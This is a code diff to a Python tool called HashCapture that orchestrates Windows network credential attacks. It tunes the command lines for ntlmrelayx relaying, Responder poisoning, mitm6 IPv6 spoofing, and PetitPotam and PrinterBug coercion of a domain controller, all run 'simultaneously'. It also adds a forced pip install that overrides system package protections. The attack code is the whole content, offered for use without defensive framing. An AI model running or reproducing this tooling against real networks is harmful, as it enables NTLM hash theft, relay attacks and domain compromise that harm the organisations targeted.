@@ -76,7 +76,7 @@ class HashCapture:
             sock.close()
             return True
         except socket.error as e:
-            self.logger.error(f"Port 53 is in use: {e}")
+            self.logger.error(f"Port 53 is already in use: {e}")
             try:
                 output = subprocess.check_output("netstat -tulpn | grep :53", shell=True).decode()
                 self.logger.error(f"Process using port 53: {output.strip()}")
@@ -176,6 +176,25 @@ class HashCapture:
         except Exception as e:
             self.logger.error(f"Error processing output for {name}: {e}")
 
+    def cleanup(self):
+        """Clean up running processes and restore system state"""
+        self.logger.info("Cleaning up processes")
+        for name, process in self.processes.items():
+            try:
+                self.logger.info(f"Terminating {name}")
+                process.terminate()
+                try:
+                    process.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    self.logger.warning(f"Force killing {name}")
+                    process.kill()
+                    process.wait()
+            except Exception as e:
+                self.logger.error(f"Error cleaning up {name}: {e}")
+
+        # Restore IPv6 forwarding
+        self.restore_ipv6_forwarding()
+
     def start_ntlmrelay(self):
         """Start NTLM relay attack"""
         try:
@@ -183,12 +202,12 @@ class HashCapture:
                 "ntlmrelayx.py",
                 "-tf", "targets.txt",
                 "-smb2support",
-                "--no-http-server",
                 "-debug"
             ]
             
             if self.domain:
                 cmd.extend([
+                    "--no-http-server",
                     "--no-wcf",
                     "--no-raw",
                     "-wh", self.local_ip
@@ -222,7 +241,9 @@ class HashCapture:
             cmd = [
                 "responder",
                 "-I", self.interface,
-                "-wrfv"  # Enable WinRM, Responder, and File Server
+                "-w",  # Enable WinPopup spoofing
+                "-f",  # Enable file server
+                "-d"   # Enable DHCP
             ]
 
             self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
@@ -253,22 +274,37 @@ class HashCapture:
             if not self.check_dns_port():
                 return False
 
+            # Install required dependencies
+            try:
+                subprocess.check_call([
+                    "pip", "install", 
+                    "service_identity",
+                    "--break-system-packages"
+                ])
+            except:
+                self.logger.warning("Could not install service_identity module")
+
             cmd = [
                 "mitm6",
                 "-i", self.interface,
-                "--debug"
+                "--debug",
+                "--no-ra"  # Disable router advertisements
             ]
             
             if self.domain:
                 cmd.extend(["-d", self.domain])
             
             self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
+            env = os.environ.copy()
+            env["PYTHONIOENCODING"] = "utf-8"
+            
             process = Popen(
                 cmd,
                 stdout=PIPE,
                 stderr=STDOUT,
                 universal_newlines=True,
-                bufsize=1
+                bufsize=1,
+                env=env
             )
             self.processes["mitm6"] = process
             
@@ -293,12 +329,10 @@ class HashCapture:
 
             cmd = [
                 "petitpotam.py",
-                "-u", "anonymous",
-                "-d", self.domain,
-                "-dc-ip", self.dc_ip,
-                "-target", self.local_ip,
-                self.local_ip,
-                self.dc_ip
+                self.local_ip,  # Listener
+                self.dc_ip,     # Target
+                "-pipe", "lsarpc",
+                "-no-pass"
             ]
             
             self.logger.info(f"Starting PetitPotam with command: {' '.join(cmd)}")
@@ -332,8 +366,8 @@ class HashCapture:
 
             cmd = [
                 "printerbug.py",
-                f"{self.domain}/anonymous",
-                self.dc_ip,
+                f"{self.domain}/anonymous:{self.dc_ip}",
+                self.local_ip,
                 "-no-pass"
             ]
             
@@ -359,27 +393,8 @@ class HashCapture:
             self.logger.error(f"Error in start_printerbug: {e}")
             return False
 
-    def cleanup(self):
-        """Clean up running processes and restore system state"""
-        self.logger.info("Cleaning up processes")
-        for name, process in self.processes.items():
-            try:
-                self.logger.info(f"Terminating {name}")
-                process.terminate()
-                try:
-                    process.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    self.logger.warning(f"Force killing {name}")
-                    process.kill()
-                    process.wait()
-            except Exception as e:
-                self.logger.error(f"Error cleaning up {name}: {e}")
-
-        # Restore IPv6 forwarding
-        self.restore_ipv6_forwarding()
-
     def run(self):
-        """Main execution flow"""
+        """Main execution flow running all attacks simultaneously"""
         self.logger.info("Starting Hash Capture Operation")
         
         # Create targets file if domain is specified
@@ -430,7 +445,6 @@ class HashCapture:
         
         return True
 
-# Part 2 to fix indents
 def main():
     parser = argparse.ArgumentParser(description="Hash Capture Tool")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
